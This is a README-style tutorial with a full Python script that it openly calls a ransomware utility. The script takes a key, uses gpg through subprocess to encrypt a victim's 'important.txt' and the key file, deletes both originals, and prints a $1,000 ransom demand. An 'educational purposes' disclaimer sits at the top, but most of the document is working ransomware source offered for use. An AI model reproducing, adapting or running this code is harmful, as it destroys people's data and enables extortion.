# Python - Symmetric Key Encryption with GPG using Subprocess

## Information
### DISCLAIMER
```
DISCLAIMER:
This is a snippet showing the utilisation of subprocess to encrypt a file with the GNU GPG application automatically "remotely" as a ransomware utility.

This is meant to be for educational purposes only. 

Please do not attack anyone unethically (of course) and without permission unless explicitly allowed to do so.
```

## Setup
### Pre-Requisites
+ A test file named "important.txt"

### Dependencies
+ gpg

## Documentation
### Steps
1. The program will request the attacker to enter a (Public) Key for the attacker to use to encrypt the 'important' file via Symmetric Key Encryption (i.e. AES) in the victim/target machine
2. Program will save the key into a text file named "key.txt"
3. Program will automatically use the key text to encrypt the file "important.txt" with gpg via "--passphrase"
4. Program will automatically use the key text to encrypt the key file "key.txt" with gpg via "--passphrase"
5. Program will automatically delete the original "important.txt"
6. Program will automatically delete the original "key.txt"
7. Program will display a ransomware message

## Usage
- Launch this on a test directory with "important.txt"
    ```python
    #!/bin/python3
    """
    :: Assumptions
    1. An attacker breaks into a victim/target machine that can run GPG
    2. Attacker puts her public key (key used to encrypt via Symmetric Key Encryption - AES) into the victim/target machine
    3. The victim/target has a file named "important.txt" in his root directory (you can write anything)

    :: Tactic
    - use subprocess to execute gpg to encrypt the file 'important.txt' with Symmetric Encryption - AES
    """
    import os
    import sys
    import subprocess
    import socket

    key_fname = "key.txt"
    victim_fname = "important.txt" # Victim has a file named "important.txt" in his root directory (can contain anything)
    ciphertext_file = "encrypted_message.asc"
    ciphertext_key = "encrypted_key.asc"
    def get_Key():
        """
        Get Key for Symmetric Key Encryption
        """
        key = input("Please enter a key for AES Symmetric Key Encryption > ")
        with open(key_fname, "w") as write_Key:
            write_Key.write(key)
            write_Key.close()
        return key

    def encrypt_Symmetric(key, passphrase, output):
        """
        Encrypt using Symmetric Key Encryption in ASCII format with custom output

        :: Params
            -c | --symmetric : Encrypt a file with Symmetric Encryption
            -a | --armor : To produce an ASCII text file (armor)
        """
        cmd_str = "gpg -c --armor --batch --passphrase {} --output {} {}".format(key, passphrase, output) # gpg command to encrypt the file 'important.txt' with Symmetric Key Encryption (AES) using the key generated
        cmd = cmd_str.split(" ")
        print("Command to Execute : {}".format(cmd))
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE) # Return the process object to the variable 'process' for communication

        # Start communication with process and retrieve the standard output (index 0) and standard error (1)
        res = process.communicate()[0]

        # Return the standard output
        return res

    def remove_File(f_name):
        if os.path.isfile(f_name):
            os.remove(f_name)

    def main():
        """
        1. Asks attacker to type a key (Private Key for Symmetric Encryption via AES) and 
            - save it to a file named key.txt
        """
        print("1. Getting Public Key for Symmetric Key Encryption")
        key = get_Key()
        print("Key : {}".format(key))
        
        print("")

        """
        2. Encrypt the file 'important.txt' using the key that the attacker selected in step 1)
            - The format of the resulting ciphertext should be ASCII
                - Has a file extension '.asc' at the end
                - Call the ciphertext file 'encrypted_message.asc'
        """
        print("2. Encrypting : {}".format(victim_fname))
        res = encrypt_Symmetric(key, ciphertext_file, victim_fname)
        print("Encryption Complete.")
        
        print("")

        """
        3. Encrypt file "key.txt" using the attacker's public key (the key that the attacker selected in step 1)
            - The format of the resulting ciphertext should be ASCII
                - Has a file extension '.asc' at the end
                - Call the ciphertext 'encrypted_key.asc'
        """
        print("3. Encrypting : {}".format(key_fname))
        res = encrypt_Symmetric(key, ciphertext_key, key_fname)
        print("Encryption Complete.")

        print("")

        """
        4. Delete file 'key.txt'
        """
        print("4. Remove : {}".format(key_fname))
        remove_File(key_fname)
        print("{} removed.".format(key_fname))

        print("")

        """
        5. Delete file 'important.txt'
        """
        print("5. Remove : {}".format(victim_fname))
        remove_File(victim_fname)
        print("{} removed.".format(victim_fname))
        
        print("")

        """
        6. Display a message for ransom - "Your file important.txt is encrypted. To decrypt it, you need to pay me $1,000 and send encrypted_key.asc to me"
        """
        print("Your file {} is encrypted. To decrypt it, you need to pay me $1,000 and send {} to me.".format(victim_fname, ciphertext_key))

        print("")


    if __name__ == "__main__":
        main()
    ```
    

